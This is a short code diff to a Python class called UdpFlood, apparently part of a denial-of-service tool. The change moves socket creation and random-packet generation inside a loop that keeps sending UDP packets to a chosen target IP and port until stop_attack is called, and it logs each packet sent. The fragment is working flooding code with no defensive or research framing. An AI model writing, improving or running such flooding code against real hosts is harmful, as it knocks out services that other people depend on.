@@ -19,10 +19,9 @@ class UdpFlood:
         return random._urandom(self.packet_size)
 
     def send_udp_packet(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        packet = self.create_udp_packet()
-
         while self.is_running:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            packet = self.create_udp_packet()
             try:
                 sock.sendto(packet, (self.target_ip, self.target_port))
                 logging.debug(Fore.GREEN + f"Sent UDP packet to {self.target_ip}:{self.target_port}")
@@ -50,3 +49,4 @@ class UdpFlood:
 
     def stop_attack(self):
         self.is_running = False
+
